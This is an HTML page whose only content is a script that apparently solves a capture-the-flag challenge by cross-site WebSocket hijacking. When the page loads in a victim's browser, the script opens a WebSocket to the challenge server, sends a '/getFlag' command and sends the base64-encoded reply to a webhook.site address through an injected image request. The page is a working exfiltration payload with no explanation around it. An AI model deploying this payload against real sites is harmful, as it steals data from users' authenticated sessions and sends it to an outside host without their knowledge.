<!DOCTYPE html>
<html>
<body>
<script>
  const ws = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");
  ws.onopen = () => {
    ws.send(JSON.stringify({ message: "/getFlag" }));
  };
  ws.onmessage = (e) => {
    try {
      const msg = JSON.parse(e.data).message;
      const i = document.createElement("img");
      i.src = "https://webhook.site/36d1845d-ac17-42f9-bfe5-727cd6aad3f2?data=" + btoa(msg);
      document.body.appendChild(i);
    } catch (err) {}
  };
</script>
</body>
</html>
